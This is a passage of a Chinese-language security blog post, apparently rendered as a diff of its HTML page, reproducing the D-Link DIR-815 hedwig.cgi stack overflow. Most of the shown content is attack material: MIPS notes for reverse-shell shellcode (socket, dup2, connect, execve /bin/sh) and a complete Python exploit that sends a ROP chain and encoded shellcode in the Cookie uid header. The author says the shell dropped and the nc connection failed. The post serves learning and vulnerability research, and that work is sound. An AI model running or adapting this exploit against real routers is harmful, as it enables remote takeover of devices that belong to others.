+<li><p><code>socket(2,2,0)</code>这里需要绕过<code>\x00</code>,所以汇编是这样</p>
+ <figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">li  $<span class="built_in">a0</span>, <span class="number">0x222</span></span><br><span class="line"><span class="keyword">addi </span>$<span class="built_in">a0</span>,-<span class="number">0x220</span></span><br><span class="line">li  $<span class="built_in">a1</span>, <span class="number">0x222</span></span><br><span class="line"><span class="keyword">addi </span>$<span class="built_in">a1</span>,-<span class="number">0x220</span></span><br><span class="line">li  $<span class="built_in">a2</span>, <span class="number">0x222</span></span><br><span class="line"><span class="keyword">addi </span>$<span class="built_in">a2</span>,-<span class="number">0x222</span></span><br><span class="line">li  $<span class="built_in">v0</span>, <span class="number">0x1057</span></span><br><span class="line"><span class="keyword">syscall </span><span class="number">0x40404</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将标准输入输出错误流重定向到sock对象</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dup2(socket_obj,0)</span><br><span class="line">dup2(socket_obj,1)</span><br><span class="line">dup2(socket_obj,2)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>int connect(int sockfd, const **struct** sockaddr *addr,socklen_t addrlen);</code>绑定攻击机器的地址</p>
+</li>
+<li><p><code>execve(&quot;/bin/sh&quot;,[&quot;/bin/sh&quot;,&quot;-i&quot;],0)</code></p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"><span class="keyword">from</span> evilblade <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>(<span class="string">&quot;./cgibin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建HTTP连接</span></span><br><span class="line">conn = http.client.HTTPConnection(<span class="string">&quot;192.168.0.1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## XOR $t0, $t0, $t0,相当于 nop，因为nop是\x00不能发送，会被sprintf截断</span></span><br><span class="line">nop = <span class="string">&quot;\x26\x40\x08\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc基地址</span></span><br><span class="line">libc = <span class="number">0x77f34000</span></span><br><span class="line"><span class="comment">#gadget</span></span><br><span class="line">gadget = <span class="number">0x159cc</span>+libc</span><br><span class="line">gadget2 = libc+<span class="number">0x158c8</span></span><br><span class="line"><span class="built_in">print</span>(p32(gadget))</span><br><span class="line"><span class="built_in">print</span>(p32(gadget2))</span><br><span class="line"></span><br><span class="line">sys = libc + <span class="number">0x531ff</span></span><br><span class="line"><span class="built_in">print</span>(p32(sys))</span><br><span class="line">dx(sys)</span><br><span class="line">sys_ = <span class="string">&#x27;\xffq\xf8w&#x27;</span></span><br><span class="line">gad_sp = <span class="string">&quot;\xcc\x99\xf4w&quot;</span></span><br><span class="line">gad_to_s5 = <span class="string">&quot;\xc8\x98\xf4w&quot;</span></span><br><span class="line"></span><br><span class="line">stg3_SC =<span class="string">&quot;\x22\x02\x04\x24\xe0\xfd\x84\x20\x22\x02\x05\x24\xe0\xfd\xa5\x20\x22\x02\x06\x24\xde\xfd\xc6\x20\x57\x10\x02\x24\x0c\x01\x01\x01&quot;</span></span><br><span class="line"><span class="comment">#socket(2,2,0)</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xe0\x01\xa2\xaf&quot;</span></span><br><span class="line"><span class="comment">#sw $v0,260($sp)</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xe0\x01\xa4\x8f\x22\x02\x05\x24\xde\xfd\xa5\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\x22\x02\x05\x24\xdf\xfd\xa5\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\x23\x02\x05\x24\xdf\xfd\xa5\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01&quot;</span></span><br><span class="line"><span class="comment">#dup2</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xe0\x01\xa4\x8f\x11\x01\x06\x24\xff\xfe\xc6\x20\x15\xbe\x0e\x3c\x03\x02\xce\x35\xff\xfd\xce\x21\xd4\x01\xae\xaf\x02\x03\x0f\x3c\xc1\xa9\xef\x35\xfd\xfe\x01\x3c\xff\xfe\x21\x34\x20\x78\xe1\x01\xd8\x01\xaf\xaf\xd4\x01\xa5\x27\x4a\x10\x02\x24\x0c\x01\x01\x01&quot;</span></span><br><span class="line"><span class="comment">#connect</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x69\x6e\x0e\x3c\x2f\x62\xce\x35\x69\x01\x0f\x3c\x30\x74\xef\x35\xfe\xfe\x01\x3c\xff\xfe\x21\x34\x20\x78\xe1\x01\x2c\x01\xae\xaf\x30\x01\xaf\xaf\x34\x01\xa0\xaf\x2c\x01\xa4\x27\x2d\x69\x0f\x24\x38\x01\xaf\xaf\x40\x01\xa4\xaf\x44\x01\xa0\xaf\x02\x01\x06\x24\xfe\xfe\xc6\x20\x40\x01\xa5\x27\xab\x0f\x02\x24\x0c\x01\x01\x01&quot;</span></span><br><span class="line"><span class="comment">#execve</span></span><br><span class="line"><span class="comment"># stg3_SC += &quot;\x24\x02\x02\x9a\x24\x04\x02\x9a\x20\x42\xfd\x76\x20\x84\xfd\x66\x01\x01\x01\x0c&quot;</span></span><br><span class="line"><span class="comment">#exit</span></span><br><span class="line"><span class="built_in">print</span>(stg3_SC.encode(),<span class="built_in">len</span>(stg3_SC))</span><br><span class="line">payload = cyclic(<span class="number">973</span>+<span class="number">34</span>).decode() + gad_to_s5 + <span class="string">&quot;cccc&quot;</span>  + gad_sp*<span class="number">8</span>  + <span class="string">&quot;dddd&quot;</span>*<span class="number">4</span> +  stg3_SC</span><br><span class="line"><span class="comment"># 设置请求头</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;21&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;accept-Encoding&#x27;</span>: <span class="string">&#x27;deflate&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;MozillIay4.0 (compatible MSIE 8.07 Winaows NT 6.17 WOW647 Triaent/4.07 SLCC27 -NET CDR 2.0.50727) -NET CLR 3.5.307297 .NET CILR 3.90.307297 Meaia CenteLr PC 6.07 .NET4.0C7 -NET4.0E)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;192.168.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;uid=&#x27;</span>+payload,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送POST请求</span></span><br><span class="line">conn.request(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;/hedwig.cgi&quot;</span>, body=<span class="string">&quot;password=123&amp;uid=3Rd4&quot;</span>, headers=headers)</span><br><span class="line"><span class="comment"># 获取响应</span></span><br><span class="line">pause()</span><br><span class="line">response = conn.getresponse()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印响应状态码和响应内容</span></span><br><span class="line"><span class="built_in">print</span>(response.status, response.read().decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭连接</span></span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/IOT%E5%85%A5%E9%97%A8/8.png" alt="8"></p>
+<p>这里可以看到拿到shell后立刻就被退出了</p>
+<p>退出gdb后按照参考文章1中的nc方法也连不上去</p>
+<p>推测原因可能和用户态的调试模式有关,但我内核模式一直模拟不成功,无法验证这种说法.就此作罢,之后再慢慢摸索吧</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>IOT之路刚开始就充满荆棘啊,不过好在还是算入门了,后续准备学习一下<code>mipsrop</code>工具的使用,http协议的消息报头啥的也不太会写,直接用<code>qemu</code>来模拟固件环境感觉还是得学一下.</p>
+<p>一堆新知识涌入脑海,后面再通过复现漏洞的方式慢慢消化吧</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hetianlab/p/18097167">踏入IOT安全世界：DIR-815路由器多次溢出漏洞分析复现(通过firmAE搭建环境)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/L1nyun/articles/18400426">D-link DIR-815路由器多次溢出漏洞分析(通过更底层的qemu搭建环境)</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_2">从零开始复现 DIR-815 栈溢出漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xueweihan/p/5319893.html">十分钟搞懂什么是cgi</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%88%9D%E8%A7%81/" rel="tag"># 初见</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/05/31/MIPS%E5%9F%BA%E7%A1%80/" rel="prev" title="MIPS基础">
+      <i class="fa fa-chevron-left"></i> MIPS基础
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-number">2.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#http%E5%8D%8F%E8%AE%AE%E5%92%8Ccgi%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.</span> <span class="nav-text">http协议和cgi协议</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#http"><span class="nav-number">3.1.</span> <span class="nav-text">http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cgi"><span class="nav-number">3.2.</span> <span class="nav-text">cgi</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">漏洞简析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">5.1.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">5.2.</span> <span class="nav-text">EXP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BA%AFROP%E9%93%BE"><span class="nav-number">5.2.1.</span> <span class="nav-text">纯ROP链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode"><span class="nav-number">5.2.2.</span> <span class="nav-text">shellcode</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">7.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sn0r1ax"
+      src="/uploads/avatar.png">
+  <p class="site-author-name" itemprop="name">Sn0r1ax</p>
+  <div class="site-description" itemprop="description">😘😘😘</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/PMexeggcute" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;PMexeggcute" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sn0r1ax</span>
+</div>
+
+<!-- <br /> --> <!-- 网站运行时间的设置 --> <span id="timeDate">载入天数...</span> <!-- <span id="times">载入时分秒...</span> --> <script>   var now = new Date();   function createtime() {     var grt= new Date("11/17/2022 8:00:00");//此处修改你的建站时间或者网站上线时间     now.setTime(now.getTime()+250);     days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);     hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);     if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);     mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}     seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);     snum = Math.round(seconds);      if(String(snum).length ==1 ){snum = "0" + snum;}     // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";     document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "+hnum + " 小时 " + mnum + " 分 " + snum + " 秒";   } setInterval("createtime()",250); </script>
+
+<!-- <br /> -->
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">...</span>
+<!-- <span id="times">载入时分秒...</span> -->
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("3/10/2025 8:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); 
+        if(String(snum).length ==1 ){snum = "0" + snum;}
+        // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "+hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
